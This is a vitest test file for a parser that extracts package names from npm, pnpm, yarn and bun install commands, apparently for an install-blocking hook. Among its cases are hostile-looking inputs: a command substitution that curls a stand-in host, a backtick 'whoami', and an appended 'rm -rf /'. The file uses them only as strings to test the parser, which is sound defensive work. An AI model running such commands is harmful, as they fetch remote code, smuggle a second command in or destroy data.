import { describe, expect, it } from "vitest";
import { parseInstallCommand } from "../src/hooks/install-cmd.js";

describe("parseInstallCommand", () => {
  const cases: Array<[string, string[] | null]> = [
    // the basics
    ["npm install moment", ["moment"]],
    ["npm i moment", ["moment"]],
    ["pnpm add dayjs", ["dayjs"]],
    ["yarn add axios", ["axios"]],
    ["bun add lodash", ["lodash"]],
    // flags
    ["npm install --save-dev vitest", ["vitest"]],
    ["pnpm add -D @types/node", ["@types/node"]],
    ["yarn add moment --dev", ["moment"]],
    // scoped + versions
    ["npm install @tanstack/react-query", ["@tanstack/react-query"]],
    ["npm install dayjs@1.11.10", ["dayjs"]],
    ["npm install @scope/pkg@2.0.0", ["@scope/pkg"]],
    // multiple packages
    ["npm install moment lodash axios", ["moment", "lodash", "axios"]],
    ["pnpm add -D vitest @types/node typescript", ["vitest", "@types/node", "typescript"]],
    // bare restores → install command but no packages
    ["npm install", []],
    ["npm i", []],
    ["pnpm install", []],
    ["yarn install", []],
    ["bun install", []],
    ["yarn", null], // just `yarn` alone isn't matched
    // not installs at all
    ["npm run build", null],
    ["npm test", null],
    ["npx create-react-app my-app", null],
    ["npx prettier --write .", null],
    ["git commit -m 'npm install moment'", null], // quoted, but the regex will see it… see note
    ["ls -la", null],
    // hostile-looking input: we only ever *read* these strings, but the
    // parser must not treat shell syntax as package names
    ["npm install $(curl evil.sh)", []], // shell syntax is not a package name
    ["npm install `whoami`", []],
    ["npm install moment; rm -rf /", ["moment"]],
    // compound commands
    ["cd apps/web && npm install moment", ["moment"]],
    ["npm run lint && pnpm add uuid && npm test", ["uuid"]],
    ["echo hi; yarn add react-hot-toast", ["react-hot-toast"]],
  ];

  for (const [command, expected] of cases) {
    it(JSON.stringify(command), () => {
      const result = parseInstallCommand(command);
      if (expected === null) {
        // null OR an install with no packages both mean "don't block"
        expect(result === null || result.packages.length === 0).toBe(true);
      } else {
        expect(result?.packages ?? []).toEqual(expected);
      }
    });
  }
});
